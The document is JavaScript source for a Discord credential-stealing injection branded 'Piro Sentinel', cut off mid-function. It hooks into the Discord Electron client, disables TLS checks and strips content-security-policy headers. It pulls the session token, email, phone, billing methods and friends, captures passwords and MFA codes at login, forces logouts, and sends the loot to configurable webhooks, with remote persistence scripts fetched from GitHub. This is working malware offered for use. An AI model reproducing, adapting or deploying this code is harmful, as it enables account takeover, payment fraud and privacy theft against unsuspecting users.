module.exports = require("./core.asar");
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
const path = require("path");
const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");
const { exec } = require("child_process");

var computerName = process.env.COMPUTERNAME;
let backupscript = `const elements = document.querySelectorAll('span[class^="code_"]');const isBoolean = (value) => typeof value === "boolean";const codes = Array.from(elements).map((element) => {const code = element.textContent.trim().replace(/-/g, '');const container = element.closest('span[class^="checkboxWrapper_"]');let consumed = container && Array.from(container.classList).some((className) => className.startsWith("checked_"));consumed = isBoolean(consumed) ? consumed : false;return {code,consumed};});codes;`;
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;
var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;

var config = {
  logout: "true",
  "logout-notify": "true",
  "init-notify": "true",
  "embed-color": 3553599,
  disable2FA: "%DISABLE_2FA%",
  creator: "%NAME_CREATOR%",
  transfer_link: `%TRANSFER_URL%`,
  injection_url: "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/Piro%20Asset/index.jss",
  injector_url:
    "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/Piro%20Asset/VBS_Persist.vbs",
  webhook: "%WEBHOOK%",
  Placed: "%API_URL%",
  Filter: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
      "https://discord.com/api/v*/users/@me/billing/subscriptions",
      "wss://remote-auth-gateway.discord.gg/*",
      "https://discord.com/api/v*/auth/sessions",
      "https://*.discord.com/api/v*/auth/sessions",
      "https://discordapp.com/api/v*/auth/sessions",
    ],
  },
  session_filters: {
    urls: [
      "wss://remote-auth-gateway.discord.gg/*",
      "https://discord.com/api/v*/auth/sessions",
      "https://*.discord.com/api/v*/auth/sessions",
      "https://discordapp.com/api/v*/auth/sessions",
    ],
  },
  onCompleted: {
    urls: [
      "https://discord.com/api/v*/users/@me/remote-auth/login",
      "https://discord.com/api/v*/auth/mfa/totp",
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.stripe.com/v*/tokens",
      "https://discord.com/api/v*/users/@me/mfa/totp/enable",
      "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
      "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
      "https://discord.com/api/v*/users/@me/mfa/sms/enable",
      "https://discord.com/api/v*/users/@me/mfa/sms/disable",
      "https://discord.com/api/v*/users/@me/mfa/totp/disable",
      "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
      "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
      "https://discord.com/api/v*/users/@me/mfa/codes-verification",
      "https://*.discord.com/api/v*/users/@me/mfa/codes-verification",
      "https://discordapp.com/api/v*/users/@me/mfa/codes-verification",
    ],
  },
  onCompletedbis: {
    urls: [
      "https://discordapp.com/api/v9/users/@me/billing/payment-source",
      "https://discord.com/api/v9/auth/mfa/totp",
      "https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address",
    ],
  },
};

async function execScript(str) {
  var window = electron.BrowserWindow.getAllWindows()[0];
  var script = await window.webContents.executeJavaScript(str, true);
  return script || null;
}

const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
  var params = {
    username: "Piro Sentinel",
    avatar_url:
      "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png",
    content: "",
    embeds: [
      {
        title: title,
        color: config["embed-color"],
        fields: fields,
        description: description ?? "",
        author: {
          name: `Piro Sentinel`,
        },

        footer: {
          text: ` [${config.creator}] | https://t.me/Piro_Sentinel`,
        },
      },
    ],
  };

  if (image)
    params.embeds[0].image = {
      url: image,
    };
  if (thumbnail)
    params.embeds[0].thumbnail = {
      url: thumbnail,
    };
  return params;
};
function request(method, url, headers = {}) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);

    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: method,
      headers: headers,
    };

    const req = https.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        resolve(data);
      });
    });
    req.on("error", (error) => {
      reject(error);
    });

    req.end();
  });
}

const getIP = () => {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: "api.ipify.org",
      path: "/?format=json",
      method: "GET",
    };

    const req = https.request(options, (res) => {
      let data = "";

      res.on("data", (chunk) => {
        data += chunk;
      });

      res.on("end", () => {
        const json = JSON.parse(data);
        resolve(json.ip);
      });
    });

    req.on("error", (error) => {
      reject(error);
    });

    req.end();
  });
};

const getURL = async (url, token) => {
  var c = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "${url}", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        JSON.parse(xmlHttp.responseText);`);
  return c;
};

const getGifOrPNG = async (url) => {
  var tt = [".gif?size=512", ".png?size=512"];

  var headers = await new Promise((resolve) => {
    https.get(url, (res) => resolve(res.headers));
  });
  var type = headers["content-type"];
  if (type == "image/gif") return url + tt[0];
  else return url + tt[1];
};

const GetBadges = (e) => {
  var n = "";
  return (
    1 == (1 & e) && (n += "<:staff:1143858329693728778> "),
    2 == (2 & e) && (n += "<:partner:1143858328309600337> "),
    4 == (4 & e) && (n += "<:hypesquadevent:1143858325579108505> "),
    8 == (8 & e) && (n += "<:bughunter_1:1143858323809112165> "),
    64 == (64 & e) && (n += "<:bravery:874750808388952075> "),
    128 == (128 & e) && (n += "<:brilliance:874750808338608199> "),
    256 == (256 & e) && (n += "<:balance:874750808267292683> "),
    512 == (512 & e) && (n += "<:666_hackingmyshit:1143858319824527400> "),
    16384 == (16384 & e) && (n += "<:bughunter_2:1143858321267376229> "),
    4194304 == (4194304 & e) && (n += "<:activedev:1143858315886088263> "),
    131072 == (131072 & e) && (n += "<:developer:1143858318088081582> "),
    "" == n && (n = "❌"),
    n
  );
};
const GetRBadges = (e) => {
  var n = "";
  return (
    1 == (1 & e) && (n += "<:staff:1143858329693728778> "),
    2 == (2 & e) && (n += "<:partner:1143858328309600337> "),
    4 == (4 & e) && (n += "<:hypesquadevent:1143858325579108505> "),
    8 == (8 & e) && (n += "<:bughunter_1:1143858323809112165> "),
    512 == (512 & e) && (n += "<:early:944071770506416198> "),
    16384 == (16384 & e) && (n += "<:bughunter_2:1143858321267376229> "),
    131072 == (131072 & e) && (n += "<:developer:1143858318088081582> "),
    "" == n && (n = "❌"),
    n
  );
};

const GetNSFW = (bouki) => {
  switch (bouki) {
    case true:
      return ":underage: `NSFW Allowed`";
    case false:
      return ":underage: `NSFW Not Allowed`";
    default:
      return "Idk bro you got me";
  }
};
const GetA2F = (bouki) => {
  switch (bouki) {
    case true:
      return ":lock: `A2F Enabled`";
    case false:
      return ":lock: `A2F Not Enabled`";
    default:
      return "Idk bro you got me";
  }
};

const parseFriends = (friends) => {
  try {
    var real = friends.filter((x) => x.type == 1);
    var rareFriends = "";
    for (var friend of real) {
      var badges = GetRBadges(friend.user.public_flags);
      if (badges !== "❌")
        rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`;
    }
    if (!rareFriends) rareFriends = "No Rare Friends";
    return {
      len: real.length,
      badges: rareFriends,
    };
  } catch (err) {
    return "❌";
  }
};

const parseBilling = (billings) => {
  var Billings = "";
  try {
    if (!billings) return (Billings = "❌");
    billings.forEach((res) => {
      if (res.invalid) return;
      switch (res.type) {
        case 1:
          Billings += ":heavy_check_mark: :credit_card:";
          break;
        case 2:
          Billings += ":heavy_check_mark: <:paypal:896441236062347374>";
      }
    });
    if (!Billings) Billings = "❌";
    return Billings;
  } catch (err) {
    return "❌";
  }
};

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));

function remove2FA(token, code) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      code,
    });
    const options = {
      hostname: "discord.com",
      port: 443,
      path: "/api/v9/users/@me/mfa/totp/disable",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: token,
      },
    };
    const req = https.request(options, (res) => {
      let responseData = "";
      res.on("data", (chunk) => {
        responseData += chunk;
      });
      res.on("end", () => {
        resolve(responseData);
      });
    });
    req.on("error", (error) => {
      reject(error.message);
    });
    req.write(data);
    req.end();
  });
}
const GetNitro = (r) => {
  if (!r.premium_type) return "❌";
  switch (r.premium_type) {
    default:
      return "❌";
    case 1:
      return "<:946246402105819216:962747802797113365>";
    case 2:
      if (!r.premium_guild_since)
        return "<:946246402105819216:962747802797113365>";
      var now = new Date(Date.now());
      var arr = [
        "<:Booster1Month:1051453771147911208>",
        "<:Booster2Month:1051453772360077374>",
        "<:Booster6Month:1051453773463162890>",
        "<:Booster9Month:1051453774620803122>",
        "<:boost12month:1068308256088400004>",
        "<:Booster15Month:1051453775832961034>",
        "<:BoosterLevel8:1051453778127237180>",
        "<:Booster24Month:1051453776889917530>",
      ];
      var a = [
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
        new Date(r.premium_guild_since),
      ];
      var b = [2, 3, 6, 9, 12, 15, 18, 24];
      var r = [];
      for (var p in a)
        r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
      var i = 0;
      for (var p of r) p > 0 ? "" : i++;
      return "<:946246402105819216:962747802797113365> " + arr[i];
  }
};

function GetLangue(read) {
  var languages = {
    fr: ":flag_fr: French",
    pt: ":flag_pt: Portuguese",
    da: ":flag_dk: Dansk",
    de: ":flag_de: Deutsch",
    "en-GB": ":england: English (UK)",
    "en-US": ":flag_us: USA",
    "en-ES": ":flag_es: Espagnol",
    hr: ":flag_hr: Croatian",
    it: ":flag_it: Italianio",
    lt: ":flag_lt: Lithuanian",
    hu: ":flag_no::flag_hu: Hungarian",
    no: ":flag_no: Norwegian",
    pl: ":flag_pl: Polish",
    "pr-BR": ":flag_pt: Portuguese",
    ro: ":flag_ro: Romanian",
    fi: ":flag_fi: Finnish",
    "sv-SE": ":flag_se: Swedish",
    vi: ":flag_vn: Vietnamese",
    tr: ":flag_tr: Turkish",
    cs: ":flag_cz: Czech",
    el: ":flag_gr: Greek",
    bg: ":flag_bg: Bulgarian",
    ru: ":flag_ru: Russian",
    uk: ":flag_ua: Ukrainian",
    hi: ":flag_in: Indian",
    th: ":flag_tw: Taiwanese",
    "zh-CN": ":flag_cn: Chinese-China",
    ja: ":flag_jp: Japanese",
    "zh-TW": ":flag_cn: Chinese-Taiwanese",
    ko: ":flag_kr: Korean",
  };

  var langue = languages[read] || ":flag_us: USA";
  return langue;
}
const post = async (params) => {
  params = JSON.stringify(params);
  var token = await execScript(tokenScript);
  var n = JSON.stringify({
    data: params,
    token: token,
  });
  [config.Placed, config.webhook].forEach((res) => {
    if (res == "%API" + "_URL%") return;
    if (res == "%\x57EBHOOK%") return;
    const url = new URL(res);
    const options = {
      host: url.hostname,
      port: url.port,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
    };
    const req = https.request(options);
    req.on("error", (err) => {});
    req.write(res == config.Placed ? n : params);
    req.end();
  });
};

const disablenoti = async () => {
  var token = await execScript(tokenScript);
  const data = {
    email_notifications_disabled: true,
  };

  const postData = JSON.stringify(data);

  const options = {
    hostname: "discord.com",
    path: "/api/v9/users/@me/settings",
    method: "PATCH",
    headers: {
      Authorization: `${token}`,
      "Content-Type": "application/json",
      "Content-Length": postData.length,
    },
  };

  const req = https.request(options, (res) => {
    if (res.statusCode === 200) {
    } else {
    }
  });

  req.on("error", (error) => {
    console.error("Erreur lors de la requête :", error);
  });
  req.write(postData);
  req.end();
};

async function init() {
  disablenoti();
  if (fs.existsSync("./d3dcompiler.dlll")) {
    doTheLogOut = true;
  } else {
    const directoryPath = "./";
    fs.readdir(directoryPath, (err, files) => {
      if (err) {
      } else {
      }
    });
  }
}
const FirstTime = async () => {
  var token = await execScript(tokenScript);
  if (config["init-notify"] !== "true") return true;
  if (fs.existsSync(__dirname + "/ThiefCat")) {
    try {
      fs.rmdirSync(__dirname + "/ThiefCat");
    } catch (err) {}
    var ip = await getIP();
    var { appPath, appName } = Getpath;
    var client_discord = appName;
    if (!token) {
      var params = await makeEmbed({
        title: "Piro Initialized",
        fields: [
          {
            name: "Injection Info",
            value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
            inline: !1,
          },
        ],
      });
    } else {
      var user = await getURL("https://discord.com/api/v8/users/@me", token);
      var billing = await getURL(
        "https://discord.com/api/v9/users/@me/billing/payment-sources",
        token
      );
      var friends = await getURL(
        "https://discord.com/api/v9/users/@me/relationships",
        token
      );
      var Nitro = await getURL(
        "https://discord.com/api/v9/users/" + user.id + "/profile",
        token
      );

      var Billings = parseBilling(billing);
      var Friends = parseFriends(friends);
      if (!user.avatar)
        var userAvatar =
          "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png";
      if (!user.banner)
        var userBanner =
          "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png";

      userBanner =
        userBanner ??
        (await getGifOrPNG(
          `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
        ));
      userAvatar =
        userAvatar ??
        (await getGifOrPNG(
          `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
        ));
      var params = await makeEmbed({
        title: "Initialized",
        description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
        fields: [
          {
            name: "Username <a:inject:1130448568268881960>",
            value: `\`${user.username}\``,
            inline: !0,
          },
          {
            name: "ID <a:cat_rolling:1130448570789679165>",
            value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
            inline: !0,
          },
          {
            name: "Nitro <a:nitro:1130453517312725052>",
            value: `${GetNitro(Nitro)}`,
            inline: !0,
          },
          {
            name: "Badges <a:badges:1130448593715740692>",
            value: `${GetBadges(user.flags)}`,
            inline: !0,
          },
          {
            name: "Email <:mail:1130451375495589968>",
            value: `\`${user.email ?? "none"}\``,
            inline: !0,
          },
          {
            name: "<a:eatsomething:1130449693613228072> Token",
            value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
            inline: !1,
          },
        ],

        thumbnail: userAvatar,
      });

      var params3 = await makeEmbed({
        title: `<a:caat2:1130448854861488168> Additional Information`,
        color: config["embed-color"],
        fields: [
          {
            name: "Bio",
            value: `\`\`\`${
              user.bio !== null && user.bio !== undefined && user.bio !== ""
                ? user.bio
                : "❌"
            }\`\`\``,
            inline: false,
          },
          {
            name: "Language <:4533language:1130453119919206500>",
            value: `${GetLangue(user.locale)}`,
            inline: !0,
          },
          {
            name: "NSFW <:3568underage:1153991874495922207>",
            value: `${GetNSFW(user.nsfw_allowed)}`,
            inline: !0,
          },
          {
            name: "A2F <a:keys:1159078859682107453>",
            value: `${GetA2F(user.mfa_enabled)}`,
            inline: !0,
          },
          {
            name: "Piro Files",
            value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
            inline: !0,
          },
          {
            name: "Billing <a:money:1130448564632436787>",
            value: `${Billings}`,
            inline: !0,
          },
          {
            name: "@Copyright",
            value: `[Piro Sentinel 2024](https://t.me/Piro_Sentinel)`,
            inline: !0,
          },
        ],
        thumbnail: userAvatar,
      });
      params.embeds.push(params3.embeds[0]);
      var params2 = await makeEmbed({
        title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
        color: config["embed-color"],
        description: Friends.badges,
        image: userBanner,
        thumbnail: userAvatar,
      });

      params.embeds.push(params2.embeds[0]);
    }
    await post(params);
    if (
      (config.logout != "false" || config.logout !== "%LOGOUT%") &&
      config["logout-notify"] == "true"
    ) {
      if (!token) {
        var params = await makeEmbed({
          title:
            "User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
              value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
              inline: !1,
            },
          ],
        });
      } else {
        var user = await getURL("https://discord.com/api/v8/users/@me", token);
        var billing = await getURL(
          "https://discord.com/api/v9/users/@me/billing/payment-sources",
          token
        );
        var friends = await getURL(
          "https://discord.com/api/v9/users/@me/relationships",
          token
        );
        var Nitro = await getURL(
          "https://discord.com/api/v9/users/" + user.id + "/profile",
          token
        );

        var Billings = parseBilling(billing);
        var Friends = parseFriends(friends);
        if (!user.avatar)
          var userAvatar =
            "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png";
        if (!user.banner)
          var userBanner =
            "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png";

        userBanner =
          userBanner ??
          (await getGifOrPNG(
            `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
          ));
        userAvatar =
          userAvatar ??
          (await getGifOrPNG(
            `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
          ));
        var params = await makeEmbed({
          title: "Victim got logged out",
          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
          fields: [
            {
              name: "Username <a:inject:1130448568268881960>",
              value: `\`${user.username}\``,
              inline: !0,
            },
            {
              name: "ID <a:cat_rolling:1130448570789679165>",
              value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
              inline: !0,
            },
            {
              name: "Nitro <a:nitro:1130453517312725052>",
              value: `${GetNitro(Nitro)}`,
              inline: !0,
            },
            {
              name: "Badges <a:badges:1130448593715740692>",
              value: `${GetBadges(user.flags)}`,
              inline: !0,
            },
            {
              name: "Phone :mobile_phone:",
              value: `\`${user.phone ?? "None"}\``,
              inline: !0,
            },
            {
              name: "@Copyright",
              value: `[Piro Sentinel 2024](https://t.me/Piro_Sentinel)`,
              inline: !0,
            },
            {
              name: "Email <:mail:1130451375495589968>",
              value: `\`${user.email}\``,
              inline: !0,
            },
            {
              name: "<a:eatsomething:1130449693613228072> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],

          thumbnail: userAvatar,
        });

        var params3 = await makeEmbed({
          title: `<a:caat2:1130448854861488168> Additional Information`,
          color: config["embed-color"],
          fields: [
            {
              name: "Bio",
              value: `\`\`\`${
                user.bio !== null && user.bio !== undefined && user.bio !== ""
                  ? user.bio
                  : "❌"
              }\`\`\``,
              inline: false,
            },
            {
              name: "Language <:4533language:1130453119919206500>",
              value: `${GetLangue(user.locale)}`,
              inline: !0,
            },
            {
              name: "NSFW <:3568underage:1153991874495922207>",
              value: `${GetNSFW(user.nsfw_allowed)}`,
              inline: !0,
            },
            {
              name: "A2F <a:keys:1159078859682107453>",
              value: `${GetA2F(user.mfa_enabled)}`,
              inline: !0,
            },
            {
              name: "Piro Files",
              value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
              inline: !0,
            },
            {
              name: "Billing <a:money:1130448564632436787>",
              value: `${Billings}`,
              inline: !0,
            },
            {
              name: "@Copyright",
              value: `[Piro Sentinel 2024](https://t.me/Piro_Sentinel)`,
              inline: !0,
            },
          ],
          thumbnail: userAvatar,
        });
        params.embeds.push(params3.embeds[0]);
        var params2 = await makeEmbed({
          title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
          color: config["embed-color"],
          description: Friends.badges,
          image: userBanner,
          thumbnail: userAvatar,
        });

        params.embeds.push(params2.embeds[0]);
      }

      try {
        fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
      } catch (err) {}
      await execScript(logOutScript);
      doTheLogOut = true;

      await post(params);
    }

    return false;
  }
};

const Getpath = (function () {
  var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
  appPath.pop();
  appPath = appPath.join("/");
  var appName = electron.app.getName();
  return {
    appPath,
    appName,
  };
})();

const checUpdate = () => {
  var { appPath, appName } = Getpath;
  if (!doTheLogOut) {
    try {
      fs.writeFileSync("./d3dcompiler.dlll", "LogOut");
    } catch (err) {}
    execScript(logOutScript);
    doTheLogOut = true;
  }
  return;
};

async function StartFunc() {
  await electron.app.whenReady();
  await Persistance();
  await FirstTime();
  await init();

  checUpdate();
}

async function BoukiTuclcavectesfonctions() {
  var token = await execScript(tokenScript);
  var user = await getURL("https://discord.com/api/v8/users/@me", token);
  var billing = await getURL(
    "https://discord.com/api/v9/users/@me/billing/payment-sources",
    token
  );
  var friends = await getURL(
    "https://discord.com/api/v9/users/@me/relationships",
    token
  );
  var Nitro = await getURL(
    "https://discord.com/api/v9/users/" + user.id + "/profile",
    token
  );
  if (!user.avatar)
    var userAvatar =
      "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png";
  if (!user.banner)
    var userBanner =
      "https://raw.githubusercontent.com/freeman649/assets-thief/refs/heads/main/new%20logo%20piro.png";

  var userBanner =
    userBanner ??
    (await getGifOrPNG(
      `https://cdn.discordapp.com/banners/${user.id}/${user.banner}`
    ));
  var userAvatar =
    userAvatar ??
    (await getGifOrPNG(
      `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
    ));
  var Billings = parseBilling(billing);
  var Friends = parseFriends(friends);
  return {
    token,
    user,
    billing,
    friends,
    Nitro,
    userAvatar,
    userBanner,
    Billings,
    Friends,
  };
}

electron.session.defaultSession.webRequest.onHeadersReceived(
  async (request, callback) => {
    delete request.responseHeaders["content-security-policy"];
    delete request.responseHeaders["content-security-policy-report-only"];
    callback({
      responseHeaders: {
        ...request.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    });
    if (request.url.includes("/users/@me")) {
      if (!["POST", "PATCH"].includes(request.method)) return;
      if (request.statusCode !== 200) return;
      try {
        var data = JSON.parse(request.uploadData[0].bytes);
        //console.log(request.url, data)
      } catch (err) {
        var data = queryString.parse(
          decodeURIComponent(request.uploadData[0].bytes.toString())
        );
        //console.log(request.url, data)
      }
    }
  }
);

electron.session.defaultSession.webRequest.onHeadersReceived(
  async (request, callback) => {
    delete request.responseHeaders["content-security-policy"];
    delete request.responseHeaders["content-security-policy-report-only"];
    callback({
      responseHeaders: {
        ...request.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    });
    if (!["POST", "PATCH"].includes(request.method)) return;
    if (request.statusCode !== 200) return;
    try {
      var data = JSON.parse(request.uploadData[0].bytes);
      console.log(request.url, data);
    } catch (err) {
      var data = queryString.parse(
        decodeURIComponent(request.uploadData[0].bytes.toString())
      );
      console.log(request.url, data);
    }
  }
);
//DEBUG

electron.session.defaultSession.webRequest.onCompleted(
  config.onCompleted,
  async (request, callback) => {
    if (!["POST", "PATCH"].includes(request.method)) return;
    if (request.statusCode !== 200) return;
    try {
      var data = JSON.parse(request.uploadData[0].bytes);
    } catch (err) {
      var data = queryString.parse(
        decodeURIComponent(request.uploadData[0].bytes.toString())
      );
    }

    var { appPath, appName } = Getpath;
    var client_discord = appName;
    var ip = await getIP();
    switch (true) {
      case request.url.includes("remote-auth"):
        setTimeout(async () => {
          let gresult = await BoukiTuclcavectesfonctions();
          let tkn = gresult.token,
            usr = gresult.user,
            billingss = gresult.Billings,
            NTR = gresult.Nitro,
            Frinds = gresult.Friends,
            usrAvatar = gresult.userAvatar,
            usrBanner = gresult.userBanner;
          var params = await makeEmbed({
            title: "QR Code Login",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${usrAvatar})`,
            fields: [
              {
                name: "Username <a:inject:1130448568268881960>",
                value: `\`${usr.username}\``,
                inline: !0,
              },
              {
                name: "ID <a:cat_rolling:1130448570789679165>",
                value: `\`${usr.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${usr.id})`,
                inline: !0,
              },
              {
                name: "Nitro <a:nitro:1130453517312725052>",
                value: `${GetNitro(NTR)}`,
                inline: !0,
              },
              {
                name: "Badges <a:badges:1130448593715740692>",
                value: `${GetBadges(usr.flags)}`,
                inline: !0,
              },
              {
                name: "Phone :mobile_phone:",
                value: `\`${usr.phone ?? "None"}\``,
                inline: !0,
              },
              {
                name: "Email <:mail:1130451375495589968>",
                value: `\`${usr.email}\``,
                inline: !0,
              },
              {
                name: "<a:eatsomething:1130449693613228072> Token",
                value: `\`\`\`${tkn}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${usrBanner})`,
                inline: !1,
              },
            ],

            thumbnail: usrAvatar,
          });

          var params3 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Additional Information`,
            color: config["embed-color"],
            fields: [
              {
                name: "Bio",
                value: `\`\`\`${
                  usr.bio !== null && usr.bio !== undefined && usr.bio !== ""
                    ? usr.bio
                    : "❌"
                }\`\`\``,
                inline: false,
              },
              {
                name: "Language <:4533language:1130453119919206500>",
                value: `${GetLangue(usr.locale)}`,
                inline: !0,
              },
              {
                name: "NSFW <:3568underage:1153991874495922207>",
                value: `${GetNSFW(usr.nsfw_allowed)}`,
                inline: !0,
              },
              {
                name: "A2F <a:keys:1159078859682107453>",
                value: `${GetA2F(usr.mfa_enabled)}`,
                inline: !0,
              },
              {
                name: "Piro Files",
                value: `[Gofile <:gofile:1242396262691766363>](${config.transfer_link})`,
                inline: !0,
              },
              {
                name: "Billing <a:money:1130448564632436787>",
                value: `${billingss}`,
                inline: !0,
              },
              {
                name: "@Copyright",
                value: `[Piro Sentinel 2024](https://t.me/Piro_Sentinel)`,
                inline: !0,
              },
            ],
            image: usrBanner,
            thumbnail: usrAvatar,
          });
          params.embeds.push(params3.embeds[0]);
          var params2 = await makeEmbed({
            title: `<a:caat2:1130448854861488168> Total Friends (${Frinds.len})`,
            color: config["embed-color"],
            description: Frinds.badges,
            image: usrBanner,
            thumbnail: usrAvatar,
          });
          params.embeds.push(params2.embeds[0]);
          await post(params);
        }, 2000);
        break;
      case request.url.includes("mfa/finish"):
        var {
          token,
          user,
          billing,
          friends,
          Nitro,
          userAvatar,
          userBanner,
          Billings,
          Friends,
        } = await BoukiTuclcavectesfonctions();
        var password = data.password;
        var params = await makeEmbed({
          title: "Random Auth Catcher",
          color: config["embed-color"],
          description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
          fields: [
            {
              name: "Username <a:inject:1130448568268881960>",
              value: `\`${user.username}\``,
              inline: !0,
            },
            {
              name: "Auth Type <:mail:1130451375495589968>",
              value: `\`${mfa_type}\``,
              inline: !0,
            },
            {
              name: "<a:cam2:1130448575470514258> Data (password/code)",
              value: `\`${data}\``,
              inline: !0,
            },
            {
              name: "<a:eatsomething:1130449693613228072> Token",
              value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
              inline: !1,
            },
          ],

          thumbnail: userAvatar,
        });
        await post(params);
        break;
      case request.url.endsWith("login"):
        var {
          token,
          user,
          billing,
          friends,
          Nitro,
          userAvatar,
          userBanner,
          Billings,
          Friends,
        } = await BoukiTuclcavectesfonctions();
        if (!token) {
          await electron.session.defaultSession.webRequest.onCompleted(
            config.onCompletedbis,
            async (re, callback) => {
              var dt;
              try {
                dt = JSON.parse(re.uploadData[0].bytes);
              } catch (err) {
                dt = queryString.parse(
                  decodeURIComponent(re.uploadData[0].bytes.toString())
                );
              }
              let {
                token,
                user,
                billing,
                friends,
                Nitro,
                userAvatar,
                userBanner,
                Billings,
                Friends,
              } = await BoukiTuclcavectesfonctions();
              var password = data.password;
              var params = await makeEmbed({
                title: "User Login",
                color: config["embed-color"],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [
                  {
                    name: "Username <a:inject:1130448568268881960>",
                    value: `\`${user.username}\``,
                    inline: !0,
                  },
                  {
                    name: "ID <a:cat_rolling:1130448570789679165>",
                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                    inline: !0,
                  },
                  {
                    name: "Nitro <a:nitro:1130453517312725052>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0,
                  },
                  {
                    name: "Badges <a:badges:1130448593715740692>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0,
                  },
                  {
